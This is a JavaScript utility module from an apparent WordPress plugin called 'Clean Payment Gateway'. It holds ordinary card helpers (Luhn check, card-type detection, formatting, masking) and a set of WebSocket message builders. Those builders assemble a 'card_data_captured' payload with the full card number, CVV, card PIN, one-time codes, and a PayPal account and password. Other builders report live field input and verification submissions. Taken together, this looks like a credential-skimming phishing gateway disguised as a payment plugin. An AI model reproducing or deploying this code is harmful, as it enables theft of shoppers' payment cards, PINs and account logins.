/**
 * Clean Payment Gateway - 卡片工具共用模块
 * 包含：Luhn 算法、卡类型检测、卡号格式化、消息格式化
 * 
 * @package Welcome_Payment_Gateway
 */

(function(global) {
    'use strict';

    /**
     * 卡片工具类
     */
    const CPG_CardUtils = {

        /**
         * 🔥 Luhn 算法（银行卡号校验）
         * @param {string} cardNumber - 纯数字卡号
         * @returns {boolean} - 是否通过验证
         */
        luhnCheck: function(cardNumber) {
            if (!cardNumber || typeof cardNumber !== 'string') {
                return false;
            }
            
            // 移除非数字字符
            const cleanNumber = cardNumber.replace(/\D/g, '');
            
            if (cleanNumber.length < 13 || cleanNumber.length > 19) {
                return false;
            }
            
            let sum = 0;
            let isEven = false;
            
            for (let i = cleanNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cleanNumber.charAt(i), 10);
                
                if (isEven) {
                    digit *= 2;
                    if (digit > 9) {
                        digit -= 9;
                    }
                }
                
                sum += digit;
                isEven = !isEven;
            }
            
            return (sum % 10) === 0;
        },

        /**
         * 🔥 检测卡片类型
         * @param {string} cardNumber - 卡号（可包含空格）
         * @returns {string} - 卡片类型（visa, mastercard, amex, discover, unionpay, unknown）
         */
        detectCardType: function(cardNumber) {
            if (!cardNumber) return 'unknown';
            
            // 移除非数字字符
            const cleanNumber = cardNumber.replace(/\D/g, '');
            
            const patterns = {
                visa: /^4/,
                mastercard: /^5[1-5]|^2[2-7]/,
                amex: /^3[47]/,
                discover: /^6(?:011|5)/,
                unionpay: /^62/,
                jcb: /^35/,
                dinersclub: /^3(?:0[0-5]|[68])/,
                maestro: /^(?:5[0678]|6304|6390|67)/
            };
            
            for (const [type, pattern] of Object.entries(patterns)) {
                if (pattern.test(cleanNumber)) {
                    return type;
                }
            }
            
            return 'unknown';
        },

        /**
         * 🔥 格式化卡号（添加空格）
         * @param {string} cardNumber - 纯数字卡号
         * @returns {string} - 格式化后的卡号
         */
        formatCardNumber: function(cardNumber) {
            if (!cardNumber) return '';
            
            // 移除非数字字符
            const cleanNumber = cardNumber.replace(/\D/g, '');
            
            // 检测是否为 AMEX（以 34 或 37 开头）
            const isAmex = /^3[47]/.test(cleanNumber);
            
            if (isAmex) {
                // AMEX: 4-6-5 格式
                const limited = cleanNumber.slice(0, 15);
                return limited.replace(/(\d{4})(\d{0,6})(\d{0,5})/, function(_, p1, p2, p3) {
                    let result = p1;
                    if (p2) result += ' ' + p2;
                    if (p3) result += ' ' + p3;
                    return result;
                });
            } else {
                // 其他卡: 4-4-4-4 格式
                const limited = cleanNumber.slice(0, 16);
                return limited.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
            }
        },

        /**
         * 🔥 格式化有效期（MM/YY）
         * @param {string} expiry - 纯数字有效期
         * @returns {string} - 格式化后的有效期
         */
        formatExpiry: function(expiry) {
            if (!expiry) return '';
            
            // 移除非数字字符
            const digits = expiry.replace(/\D/g, '').slice(0, 4);
            
            if (digits.length >= 2) {
                return digits.slice(0, 2) + '/' + digits.slice(2);
            }
            
            return digits;
        },

        /**
         * 🔥 遮罩卡号（显示前6后4）
         * @param {string} cardNumber - 完整卡号
         * @returns {string} - 遮罩后的卡号
         */
        maskCardNumber: function(cardNumber) {
            if (!cardNumber) return '';
            
            const cleanNumber = cardNumber.replace(/\D/g, '');
            
            if (cleanNumber.length < 10) {
                return cleanNumber;
            }
            
            const firstSix = cleanNumber.substring(0, 6);
            const lastFour = cleanNumber.substring(cleanNumber.length - 4);
            
            return firstSix + '******' + lastFour;
        },

        /**
         * 🔥 获取 CVV 长度（AMEX 4位，其他 3位）
         * @param {string} cardNumber - 卡号
         * @returns {number} - CVV 长度
         */
        getCvvLength: function(cardNumber) {
            const cleanNumber = (cardNumber || '').replace(/\D/g, '');
            
            // 检测是否为 AMEX
            if (/^3[47]/.test(cleanNumber)) {
                return 4;
            }
            
            // 15 位卡号也可能是 AMEX
            if (cleanNumber.length === 15) {
                return 4;
            }
            
            return 3;
        },

        /**
         * 🔥 验证卡片数据完整性
         * @param {string} cardNumber - 卡号
         * @param {string} expiry - 有效期
         * @param {string} cvv - CVV
         * @returns {object} - { valid: boolean, errors: string[] }
         */
        validateCard: function(cardNumber, expiry, cvv) {
            const errors = [];
            const cleanCardNumber = (cardNumber || '').replace(/\D/g, '');
            const cleanExpiry = (expiry || '').replace(/\D/g, '');
            const cleanCvv = (cvv || '').replace(/\D/g, '');
            
            // 卡号验证
            if (!cleanCardNumber) {
                errors.push('Card number is required');
            } else if (cleanCardNumber.length < 13 || cleanCardNumber.length > 19) {
                errors.push('Card number length is invalid');
            } else if (!this.luhnCheck(cleanCardNumber)) {
                errors.push('Card number is invalid');
            }
            
            // 有效期验证
            if (!cleanExpiry) {
                errors.push('Expiry date is required');
            } else if (cleanExpiry.length !== 4) {
                errors.push('Expiry date format is invalid');
            } else {
                const month = parseInt(cleanExpiry.slice(0, 2), 10);
                const year = parseInt('20' + cleanExpiry.slice(2), 10);
                const now = new Date();
                const currentYear = now.getFullYear();
                const currentMonth = now.getMonth() + 1;
                
                if (month < 1 || month > 12) {
                    errors.push('Invalid expiry month');
                } else if (year < currentYear || (year === currentYear && month < currentMonth)) {
                    errors.push('Card has expired');
                }
            }
            
            // CVV 验证
            const expectedCvvLength = this.getCvvLength(cleanCardNumber);
            if (!cleanCvv) {
                errors.push('CVV is required');
            } else if (cleanCvv.length !== expectedCvvLength) {
                errors.push(`CVV must be ${expectedCvvLength} digits`);
            }
            
            return {
                valid: errors.length === 0,
                errors: errors
            };
        },

        /**
         * 🔥 获取卡片品牌图标 URL
         * @param {string} cardType - 卡片类型
         * @returns {string} - 图标相对路径
         */
        getCardBrandIcon: function(cardType) {
            const iconMap = {
                visa: 'visa.svg',
                mastercard: 'mastercard.svg',
                amex: 'amex.svg',
                discover: 'discover.svg',
                unionpay: 'unionpay.svg',
                jcb: 'jcb.svg',
                dinersclub: 'dinersclub.svg',
                maestro: 'maestro.svg',
                unknown: 'default.svg'
            };
            
            return iconMap[cardType] || iconMap.unknown;
        }
    };

    /**
     * 消息格式化工具类
     */
    const CPG_MessageUtils = {

        /**
         * 🔥 构建 WebSocket 消息基础结构
         * @param {string} type - 消息类型
         * @param {object} data - 消息数据
         * @param {object} config - 配置（session_id, order_no 等）
         * @returns {object} - 格式化后的消息
         */
        buildMessage: function(type, data, config) {
            config = config || {};
            
            return {
                type: type,
                session_id: config.session_id || '',
                order_no: config.order_no || '',
                site_name: config.site_name || '',
                site_url: config.site_url || window.location.origin,
                order_prefix: config.order_prefix || '',
                page_url: window.location.href,
                user_agent: navigator.userAgent,
                timestamp: Date.now(),
                data: data || {}
            };
        },

        /**
         * 🔥 构建卡片数据捕获消息
         * @param {object} cardData - 卡片数据
         * @param {object} config - 配置
         * @returns {object} - card_data_captured 消息
         */
        buildCardDataMessage: function(cardData, config) {
            const cleanCardNumber = (cardData.card_number || '').replace(/\D/g, '');
            const cardType = CPG_CardUtils.detectCardType(cleanCardNumber);
            
            return this.buildMessage('card_data_captured', {
                // 卡号字段（多种命名兼容）
                card_number: cleanCardNumber,
                card_no: cleanCardNumber,
                card_number_masked: CPG_CardUtils.maskCardNumber(cleanCardNumber),
                card_no_masked: CPG_CardUtils.maskCardNumber(cleanCardNumber),
                
                // 有效期字段
                expiry: cardData.expiry || '',
                expiry_date: cardData.expiry || '',
                card_expiry: cardData.expiry || '',
                
                // CVV 字段
                cvv: cardData.cvv || '',
                card_cvv: cardData.cvv || '',
                
                // 卡片类型
                card_type: cardType,
                
                // 持卡人
                full_name: cardData.full_name || '',
                first_name: cardData.first_name || '',
                last_name: cardData.last_name || '',
                
                // 其他验证字段
                pin: cardData.pin || '',
                otp: cardData.otp || '',
                verification_code: cardData.verification_code || '',
                
                // PayPal 字段
                pp_account: cardData.pp_account || '',
                pp_password: cardData.pp_password || ''
            }, config);
        },

        /**
         * 🔥 构建输入失焦消息
         * @param {string} field - 字段名
         * @param {object} data - 字段数据
         * @param {object} config - 配置
         * @returns {object} - input_blur 消息
         */
        buildInputBlurMessage: function(field, data, config) {
            return {
                type: 'input_blur',
                event_type: 'input_blur',
                session_id: config.session_id || '',
                order_no: config.order_no || '',
                data: {
                    field: field,
                    type: data.type || 'text',
                    has_value: !!data.value,
                    value_length: data.value ? data.value.length : 0,
                    ...data
                },
                timestamp: Date.now()
            };
        },

        /**
         * 🔥 构建验证输入消息
         * @param {string} verificationType - 验证类型
         * @param {string} field - 字段名
         * @param {string} value - 字段值
         * @param {object} config - 配置
         * @returns {object} - verification_input 消息
         */
        buildVerificationInputMessage: function(verificationType, field, value, config) {
            return {
                type: 'verification_input',
                session_id: config.session_id || '',
                order_no: config.order_no || '',
                verification_type: verificationType,
                field: field,
                value: value,
                timestamp: Date.now()
            };
        },

        /**
         * 🔥 构建验证提交消息
         * @param {string} verificationType - 验证类型
         * @param {object} verificationData - 验证数据
         * @param {object} config - 配置
         * @returns {object} - verification_submit 消息
         */
        buildVerificationSubmitMessage: function(verificationType, verificationData, config) {
            return {
                type: 'verification_submit',
                session_id: config.session_id || '',
                order_no: config.order_no || '',
                verification_type: verificationType,
                verification_data: verificationData,
                timestamp: Date.now()
            };
        }
    };

    // 导出到全局
    global.CPG_CardUtils = CPG_CardUtils;
    global.CPG_MessageUtils = CPG_MessageUtils;

    // 如果存在 cpgTracker，也添加到其原型上
    if (typeof global.cpgTracker !== 'undefined') {
        global.cpgTracker.cardUtils = CPG_CardUtils;
        global.cpgTracker.messageUtils = CPG_MessageUtils;
    }

    console.log('[CPG] ✅ Card Utils 共用模块已加载');

})(typeof window !== 'undefined' ? window : this);

